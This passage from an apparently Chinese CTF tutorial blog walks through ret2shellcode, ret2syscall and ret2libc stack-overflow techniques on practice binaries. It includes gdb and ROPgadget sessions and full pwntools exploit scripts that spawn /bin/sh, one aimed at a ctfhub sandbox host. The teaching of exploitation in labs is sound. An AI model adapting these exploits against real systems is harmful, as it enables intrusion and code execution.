plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>32位且无任何保护开启</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">100u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IDA分析，无system函数，gets函数存在栈溢出漏洞，进入buf2查看可知其位于bss段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db 64h dup(?)                      ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+_bss ends</span><br></pre></td></tr></table></figure><blockquote><p>.bss段通常是用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。</p><p>特点是可读写，在程序执行之前.bss会自动清0</p></blockquote><p>通过gdb查看这个bss段是否可执行，b main设置断点，r执行，vmmap查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start      End        PermName</span><br><span class="line">0x08048000 0x08049000 r-xp/home/giantbranch/Desktop/CTF/ret2shellcode</span><br><span class="line">0x08049000 0x0804a000 r-xp/home/giantbranch/Desktop/CTF/ret2shellcode</span><br><span class="line">0x0804a000 0x0804b000 rwxp/home/giantbranch/Desktop/CTF/ret2shellcode</span><br><span class="line">0xf7e03000 0xf7e04000 rwxpmapped</span><br><span class="line">0xf7e04000 0xf7fb4000 r-xp/lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 ---p/lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb5000 0xf7fb7000 r-xp/lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb7000 0xf7fb8000 rwxp/lib/i386-linux-gnu/libc-2.23.so</span><br><span class="line">0xf7fb8000 0xf7fbb000 rwxpmapped</span><br><span class="line">0xf7fd3000 0xf7fd4000 rwxpmapped</span><br><span class="line">0xf7fd4000 0xf7fd7000 r--p[vvar]</span><br><span class="line">0xf7fd7000 0xf7fd9000 r-xp[vdso]</span><br><span class="line">0xf7fd9000 0xf7ffc000 r-xp/lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp/lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp/lib/i386-linux-gnu/ld-2.23.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp[stack]</span><br></pre></td></tr></table></figure><p>通过vmmap可以看到对应的bss段具有可执行权限</p><p>那么就可以考虑让程序跳转到shellcode中，通过栈溢出把shellcode赋给buf2，执行bss段的shellcode</p><p>第一种办法</p><p>IDA中能够看到：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804858C 8D 44 24 1C                   lea     eax, [esp+80h+s]</span><br><span class="line">.text:08048590 89 04 24                      mov     [esp], eax                      ; s</span><br><span class="line">.text:08048593 E8 38 FE FF FF                call    _gets</span><br></pre></td></tr></table></figure><p>get函数的地址为0x08048593</p><p>在gdb中查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-peda$ disass 0x08048593</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0804852d &lt;+0&gt;:push   ebp</span><br><span class="line">   0x0804852e &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">   0x08048530 &lt;+3&gt;:and    esp,0xfffffff0</span><br><span class="line">   0x08048533 &lt;+6&gt;:add    esp,0xffffff80</span><br><span class="line">   0x08048536 &lt;+9&gt;:mov    eax,ds:0x804a060</span><br><span class="line">   0x0804853b &lt;+14&gt;:mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">   0x08048543 &lt;+22&gt;:mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">   0x0804854b &lt;+30&gt;:mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">   0x08048553 &lt;+38&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048556 &lt;+41&gt;:call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x0804855b &lt;+46&gt;:mov    eax,ds:0x804a040</span><br><span class="line">   0x08048560 &lt;+51&gt;:mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">   0x08048568 &lt;+59&gt;:mov    DWORD PTR [esp+0x8],0x1</span><br><span class="line">   0x08048570 &lt;+67&gt;:mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">   0x08048578 &lt;+75&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804857b &lt;+78&gt;:call   0x8048410 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x08048580 &lt;+83&gt;:mov    DWORD PTR [esp],0x8048660</span><br><span class="line">   0x08048587 &lt;+90&gt;:call   0x80483e0 &lt;puts@plt&gt;</span><br><span class="line">   0x0804858c &lt;+95&gt;:lea    eax,[esp+0x1c]</span><br><span class="line">   0x08048590 &lt;+99&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">=&gt; 0x08048593 &lt;+102&gt;:call   0x80483d0 &lt;gets@plt&gt;</span><br><span class="line">   0x08048598 &lt;+107&gt;:mov    DWORD PTR [esp+0x8],0x64</span><br><span class="line">   0x080485a0 &lt;+115&gt;:lea    eax,[esp+0x1c]</span><br><span class="line">   0x080485a4 &lt;+119&gt;:mov    DWORD PTR [esp+0x4],eax</span><br><span class="line">   0x080485a8 &lt;+123&gt;:mov    DWORD PTR [esp],0x804a080</span><br><span class="line">   0x080485af &lt;+130&gt;:call   0x8048420 &lt;strncpy@plt&gt;</span><br><span class="line">   0x080485b4 &lt;+135&gt;:mov    DWORD PTR [esp],0x8048680</span><br><span class="line">   0x080485bb &lt;+142&gt;:call   0x80483c0 &lt;printf@plt&gt;</span><br><span class="line">   0x080485c0 &lt;+147&gt;:mov    eax,0x0</span><br><span class="line">   0x080485c5 &lt;+152&gt;:leave  </span><br><span class="line">   0x080485c6 &lt;+153&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>s相对于esp的索引为<code>esp + 0x1c</code></p><p>断点下在0x08048593，r运行，查看esp和ebp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EBP  0xffffd018 ◂— 0x0</span><br><span class="line">ESP  0xffffcf90 —▸ 0xffffcfac —▸ 0x80482d0 ◂— pop    edi</span><br></pre></td></tr></table></figure><p>esp为<code>0xffffCF90</code>，ebp为<code>0xffffd018</code>，那么s的地址为<code>0xffffcfac</code>，s相对于ebp的偏移为<code>6c</code>，s相对于返回地址偏移<code>0x6c + 4</code></p><p>第二种办法，类似于ret2text直接找</p><p>第三种办法</p><p>利用GDB调试，<code>cyclic 200</code>生成200个字符的字符串，r运行，输入生成的字符串，显示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Invalid address 0x62616164</span><br></pre></td></tr></table></figure><p>程序报错，说明我们输入的字符覆盖了eip，即字符“daab”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EAX  0x0</span><br><span class="line">EBX  0x0</span><br><span class="line">ECX  0xffffffff</span><br><span class="line">EDX  0xf7fb8870 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line">EDI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">ESI  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0</span><br><span class="line">EBP  0x62616163 (&#x27;caab&#x27;)</span><br><span class="line">ESP  0xffffd020 ◂— 0x62616165 (&#x27;eaab&#x27;)</span><br><span class="line">EIP  0x62616164 (&#x27;daab&#x27;)</span><br></pre></td></tr></table></figure><p><code>cyclic -l 0x62616164</code>或<code>cyclic -l daab</code>计算字符串偏移量可得112</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#生成一个执行 /bin/sh 的机器码</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目练习-1"><a href="#题目练习-1" class="headerlink" title="题目练习"></a>题目练习</h3><p><strong>题目来源：ctfhub</strong></p><ul><li><p>首先检查保护措施</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>保护全关</p><p>运行能看到会生成一个地址，放到IDA里面</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 buf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFHub ret2shellcode!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What is it : [%p] ?\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input someting : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">1024uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这道题没有自带的system函数，保护没开，可以使用ret2shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-0000000000000010 buf dq ?</span><br><span class="line">-0000000000000008 var_8 dq ?</span><br><span class="line">+0000000000000000  s db 8 dup(?)</span><br><span class="line">+0000000000000008  r db 8 dup(?)</span><br></pre></td></tr></table></figure><p>​printf可以直接输出buf的地址，<code>__int64 buf[2]; // [rsp+0h] [rbp-10h] BYREF</code>可以得出，buf相对于rbp的偏移为：<code>0x10</code>，加上返回地址<code>0x08</code>（64位），所以buf的大小为<code>0x10 + 0x08</code>。所以可用的空间为24字节（0x18），虽然有23字节的shellcode，但是因为其本身有push指令，如果把shellcode放到返回地址之前，那么在程序返回时会破坏shellcode，所以将shellcode放到函数的return地址之后（call main指令的下一条地址，执行完main函数后，会ret并从栈中pop出给RIP），所以将其覆盖为shellcode的地址就可以获得shell</p><ul><li>由上面的分析可知，假设填充的大小padding为<code>0x18</code>，假设buf的地址为buf_addr，那么加32<code>(0x10 + 0x08 +0x08)</code>就可以跳过填充数据和返回地址，shellcode使用pwntools生成的</li></ul><p>​借一下大佬的图，很直观<a href="https://blog.csdn.net/m0_43405474/article/details/126546838">CTFhub-pwn-[ret2shellcode]_ctfhub ret2shellcode_沧海一粟日尽其用的博客-CSDN博客</a></p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211843545.png" alt="image-20230626094949977"></p><ul><li>EXP</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">host=<span class="string">&#x27;challenge-df513d1e25503d2f.sandbox.ctfhub.com&#x27;</span></span><br><span class="line">port=<span class="number">29219</span></span><br><span class="line">io=connect(host,port)</span><br><span class="line"><span class="comment">#io=process(&#x27;./ret2shellcode&#x27;)</span></span><br><span class="line">padding=<span class="number">0x18</span></span><br><span class="line"><span class="comment">#Get the addr of buf</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">buf_addr=io.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input someting :&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;buf_addr:&#x27;</span>,buf_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">payload=flat([<span class="string">&#x27;a&#x27;</span>*padding,p64(<span class="built_in">int</span>(buf_addr,<span class="number">16</span>)+<span class="number">32</span>),asm(shellcraft.sh())])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;payload:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h4><p>ret 结尾的指令序列，通过这些指令序列可以修改某些地址的内容，方便控制程序的执行流程</p><p>比如：<code>pop eax ; ret</code></p><p>这两个指令的作用就是将栈顶的数据pop给eax，然后将栈顶的数据作为返回地址返回，如果通过栈溢出把eip覆盖为pop eax的地址，程序返回时就会执行pop eax </p><h4 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h4><ul><li><p>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数</p></li><li><p>应用程序调用系统调用的过程是：</p><ul><li>把系统调用的编号存入EAX</li><li>把函数参数存入其他寄存器</li><li>触发0x80号中断（int 80h）</li></ul></li><li><p>比如<code>execve(&quot;/bin/sh&quot;,null,null)</code>这个函数，其函数调用过程为：</p><ul><li>系统调用号，即 eax 应该为 0xb </li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0 </li><li>第三个参数，即 edx 应该为 0</li></ul></li></ul><p>通过ROP控制程序执行系统调用，获取 shell，通过系统调用来获取 shell 就需要把系统调用的参数放入各个寄存器，然后执行 int 0x80 指令</p><h3 id="示例复现-2"><a href="#示例复现-2" class="headerlink" title="示例复现"></a>示例复现</h3><p>题目来源：ctf_wiki</p><p>查看保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>开了NX保护，32位 </p><p>IDA查看源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>能够看到是栈溢出，和前面做法类似，算出要覆盖的返回地址相对于v4的偏移为112。</p><p>由于不能直接利用程序中的某一段代码或者是自己填写的代码来获得shell，所以可以尝试利用程序中的gadgets来获得shell，而获得对应shell是利用系统调用实现的。</p><p>利用<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code>，那么就需要控制寄存器的值，需要使用的gadgets。一般来说不会有连续的代码可以同时控制对应的寄存器，所以需要一段一段地控制对应的寄存器，这也就是为什么要在gadgets最后使用ret来再次控制程序流程的原因。</p><p>寻找 gadgets 可以使用 ropgadgets 这个工具</p><p>首先寻找控制eax的gadgets，<code>ROPgadget --binary ./ret2syscall --only &quot;pop|ret&quot; | grep &quot;eax&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ./ret2syscall --only &quot;pop|ret&quot; | grep &quot;eax&quot;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>可以看到上述几个都可以控制eax，这里选取第二个来作为gadgets</p><p>同理可以得到控制其他寄存器的gadgets，<code>ROPgadget --binary ./ret2syscall --only &quot;pop|ret&quot; | grep &quot;ebx&quot; | grep &quot;ecx&quot; | grep &quot;edx&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ./ret2syscall --only &quot;pop|ret&quot; | grep &quot;ebx&quot; | grep &quot;ecx&quot; | grep &quot;edx&quot; </span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>然后我们还需要获得&#x2F;bin&#x2F;sh字符串对应的地址，<code>ROPgadget --binary ./ret2syscall --string &quot;/bin/sh&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ./ret2syscall --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p>找到int 0x80的地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ./ret2syscall --only &quot;int&quot;|grep &quot;0x80&quot;</span><br><span class="line">0x08049421 : int 0x80</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2syscall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat(</span><br><span class="line">    [<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>如果目标程序调用的函数较少，或者使用动态编译，导致可用的gadgets变少，就无法达到利用效果，那么就可以到动态链接库中寻找gadgets。</p><p>控制函数执行libc中的函数，一般是返回至某个函数的plt处或者函数的具体位置，比如要执行system(“&#x2F;bin&#x2F;sh”)，就需要知道system函数的地址</p><h4 id="libc泄露"><a href="#libc泄露" class="headerlink" title="libc泄露"></a>libc泄露</h4><p>如果题目源码中既没有找到system函数，也没有找到‘&#x2F;bin&#x2F;sh’，那么就需要用到libc泄露。这时候就可以利用在栈溢出之前执行过的函数来泄露libc的版本。因为libc函数相对于libc的基地址都是确定的，即函数之间相对偏移是固定的，即便程序有ASLR保护，也只是针对地址中间位进行随机，最低的12位并不会发生改变，github上有人对libc进行了收集：</p><p><a href="https://github.com/niklasb/libc-database">niklasb&#x2F;libc-database: Build a database of libc offsets to simplify exploitation (github.com)</a></p><p>常用的办法是GOT表泄露，输出某个函数对应的got表项内容，由于延迟绑定机制，需要泄露已经执行过的函数的地址。</p><h3 id="示例复现1"><a href="#示例复现1" class="headerlink" title="示例复现1"></a>示例复现1</h3><p>题目来源：ctf-wiki</p><p>检查保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位，NX保护开启</p><p>IDA查看源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gets函数，有栈溢出，能看到有个secure函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;shell!?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是system函数里面的参数并不是&#x2F;bin&#x2F;sh，如果单纯的将返回地址覆盖为system函数的地址并执行，那么会产生错误，因为shell!?不是一个系统命令，所以需要让system的参数变为&#x2F;bin&#x2F;sh。</p><p>程序调用system函数时，会自动寻找ebp指向的位置，然后将ebp+8的位置的数据当作函数的参数，那么如果要将&#x2F;bin&#x2F;sh作为system函数的参数，可以利用栈溢出，修改eip为system函数地址后，填充4个字节的垃圾数据，然后将&#x2F;bin&#x2F;sh的地址作为参数。</p><p>找到system函数的地址：</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312211845348.png" alt="image-20230714185218657"></p><p>注意要找的是plt的</p><p>&#x2F;bin&#x2F;sh地址为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">giantbranch@ubuntu:~/Desktop/CTF$ ROPgadget --binary ./ret2libc1 --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>依照前面的方法确定栈溢出大小为112。</p><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt,<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>,binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="示例复现2"><a href="#示例复现2" class="headerlink" title="示例复现2"></a>示例复现2</h3><p>检查保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>32位开了NX保护</p><p>查看源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;no_shell_QQ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显的栈溢出，并且secure函数中有system函数，并且通过查找字符串等并没有发现&#x2F;bin&#x2F;sh的存在，那么就需要自己写一个&#x2F;bin&#x2F;sh作为system函数的参数，让程序执行system(‘&#x2F;bin&#x2F;sh’)，从而控制程序。可以通过栈溢出将返回地址覆盖为gets函数的地址，然后再将bss段的地址作为函数的参数，将’&#x2F;bin&#x2F;sh’写入到bss段，然后把调用的gets函数的返回地址覆盖为system函数的地址，参数为写入到bss段的’&#x2F;bin&#x2F;sh’字符串的地址。</p><p>先找get函数和system函数的地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 